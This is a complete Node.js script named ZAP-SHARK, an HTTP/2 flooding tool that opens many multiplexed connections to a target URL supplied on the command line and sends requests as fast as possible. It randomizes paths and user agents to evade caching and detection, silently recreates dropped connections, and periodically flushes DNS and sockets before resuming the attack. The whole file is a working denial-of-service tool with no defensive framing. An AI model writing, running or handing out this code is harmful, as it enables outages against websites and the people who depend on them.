const http2 = require('http2');
const os = require('os');
const { exec } = require('child_process');

class ZAPSHARK {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // H2 ABUSE SETTINGS
        this.maxStreams = 100; // H2 multiplexing - multiple streams per connection
        this.activeStreams = 0;
        this.connectionPool = [];
        this.poolSize = 10; // Multiple H2 connections
        
        // Maintenance
        this.lastMaintenance = Date.now();
        this.maintenanceInterval = 3600000;
        this.maintenanceDuration = 600000;
        
        this.attackInterval = null;
    }

    async setupConnections() {
        // Create multiple H2 connections for true abuse
        for (let i = 0; i < this.poolSize; i++) {
            try {
                const client = http2.connect(this.targetUrl, {
                    maxSessionMemory: 16384,
                    maxDeflateDynamicTableSize: 4294967296
                });
                
                client.setMaxListeners(1000);
                
                client.on('connect', () => {
                    console.log(`H2 Connection ${i+1} established`);
                });
                
                client.on('error', (err) => {
                    // Silent fail - recreate connection
                    setTimeout(() => {
                        const index = this.connectionPool.indexOf(client);
                        if (index > -1) {
                            this.connectionPool.splice(index, 1);
                        }
                        this.createConnection();
                    }, 100);
                });
                
                client.on('remoteSettings', (settings) => {
                    // Use server's max concurrent streams setting
                    if (settings.maxConcurrentStreams) {
                        this.maxStreams = Math.min(settings.maxConcurrentStreams, 1000);
                    }
                });
                
                this.connectionPool.push(client);
                
                // Small delay between connection establishments
                await new Promise(resolve => setTimeout(resolve, 50));
                
            } catch (err) {
                // Continue anyway
            }
        }
    }

    createConnection() {
        try {
            const client = http2.connect(this.targetUrl);
            client.on('error', () => {});
            this.connectionPool.push(client);
        } catch (err) {}
    }

    sendRequest() {
        if (this.connectionPool.length === 0) return;

        // Use H2 multiplexing - send multiple requests per connection
        const streamsPerTick = Math.min(this.maxStreams - this.activeStreams, 10);
        
        for (let i = 0; i < streamsPerTick; i++) {
            const client = this.connectionPool[Math.floor(Math.random() * this.connectionPool.length)];
            
            if (!client) continue;

            try {
                this.activeStreams++;
                
                const req = client.request({
                    ':method': 'GET',
                    ':path': this.getRandomPath(),
                    ':authority': new URL(this.targetUrl).hostname,
                    'user-agent': this.getRandomUserAgent(),
                    'accept': '*/*',
                    'accept-encoding': 'gzip, deflate, br',
                    'cache-control': 'no-cache'
                });
                
                req.on('response', (headers) => {
                    // Ignore response - just count
                });
                
                req.on('error', () => {
                    // Silent fail
                });
                
                req.on('close', () => {
                    this.activeStreams--;
                    this.totalRequests++;
                    this.requestsSinceLastCalc++;
                });
                
                // Send minimal payload
                req.end();
                
            } catch (err) {
                this.activeStreams--;
                this.totalRequests++;
                this.requestsSinceLastCalc++;
            }
        }
    }

    getRandomPath() {
        // Random paths to avoid caching
        const paths = ['/', '/api', '/v1', '/v2', '/test', '/data', '/users', '/products'];
        return paths[Math.floor(Math.random() * paths.length)] + '?r=' + Math.random().toString(36).substring(7);
    }

    getRandomUserAgent() {
        const agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36'
        ];
        return agents[Math.floor(Math.random() * agents.length)];
    }

    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    formatRuntime() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const minutes = Math.floor(runtime / 60) % 60;
        const seconds = runtime % 60;
        return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }

    updateDisplay() {
        this.calculateRPS();
        
        process.stdout.write(`\rZAP-SHARK: (${this.formatRuntime()}) | (${this.status}) ` +
                           `TOTAL: ${this.totalRequests} | ` +
                           `RPS: ${this.currentRPS.toFixed(1)} | ` +
                           `CONNS: ${this.connectionPool.length} | ` +
                           `STREAMS: ${this.activeStreams}`);
    }

    flushDNS() {
        if (os.platform() === 'win32') {
            exec('ipconfig /flushdns', () => {});
        } else {
            exec('sudo dscacheutil -flushcache 2>/dev/null || sudo systemd-resolve --flush-caches 2>/dev/null || echo ""', () => {});
        }
    }

    flushSockets() {
        // Destroy all connections
        this.connectionPool.forEach(client => {
            try {
                client.destroy();
            } catch (err) {}
        });
        this.connectionPool = [];
        this.activeStreams = 0;
        
        // Recreate connections
        setTimeout(() => this.setupConnections(), 1000);
    }

    checkMaintenance() {
        const currentTime = Date.now();
        const timeSinceLastMaintenance = currentTime - this.lastMaintenance;
        
        if (timeSinceLastMaintenance >= this.maintenanceInterval && this.status === "ATTACKING") {
            console.log('\n=== MAINTENANCE STARTED ===');
            this.status = "PAUSED";
            
            if (this.attackInterval) {
                clearInterval(this.attackInterval);
                this.attackInterval = null;
            }
            
            this.flushDNS();
            this.flushSockets();
            
            setTimeout(() => {
                this.resumeAttack();
            }, this.maintenanceDuration);
            
            this.lastMaintenance = currentTime;
        }
    }

    resumeAttack() {
        this.status = "ATTACKING";
        this.lastMaintenance = Date.now();
        console.log('\n=== MAINTENANCE COMPLETED - RESUMING ATTACK ===');
        this.startAttack();
    }

    startAttack() {
        // MAX RPS - minimal interval with H2 multiplexing
        if (this.attackInterval) {
            clearInterval(this.attackInterval);
        }
        
        this.attackInterval = setInterval(() => {
            if (this.status === "ATTACKING") {
                // Send multiple requests per tick using H2 multiplexing
                for (let i = 0; i < 5; i++) {
                    this.sendRequest();
                }
                this.updateDisplay();
            }
        }, 0.1); // Aggressive timing
    }

    async start() {
        console.log("=== ZAP-SHARK MAX H2 ABUSE ===");
        console.log("Protocol: HTTP/2 MULTIPLEXING");
        console.log("Connections:", this.poolSize);
        console.log("Max Streams:", this.maxStreams);
        console.log("Mode: MAXIMUM H2 ABUSE");
        console.log("Target:", this.targetUrl);
        console.log("=".repeat(50));
        
        await this.setupConnections();
        
        // Wait a bit for connections to establish
        setTimeout(() => {
            this.startAttack();
        }, 2000);
        
        // Maintenance checker
        setInterval(() => {
            this.checkMaintenance();
        }, 1000);
        
        // Auto-replenish connections
        setInterval(() => {
            if (this.connectionPool.length < this.poolSize && this.status === "ATTACKING") {
                this.createConnection();
            }
        }, 5000);
        
        process.on('SIGINT', () => this.stop());
    }

    stop() {
        this.running = false;
        if (this.attackInterval) clearInterval(this.attackInterval);
        this.connectionPool.forEach(client => {
            try { client.destroy(); } catch (err) {}
        });
        console.log('\n=== ZAP-SHARK DESTROYED ===');
        process.exit(0);
    }
}

// Usage
const target = process.argv[2];
if (!target || !target.startsWith('https://')) {
    console.log('Usage: node zap-shark.js https://target.com');
    process.exit(1);
}

const shark = new ZAPSHARK(target);
shark.start();
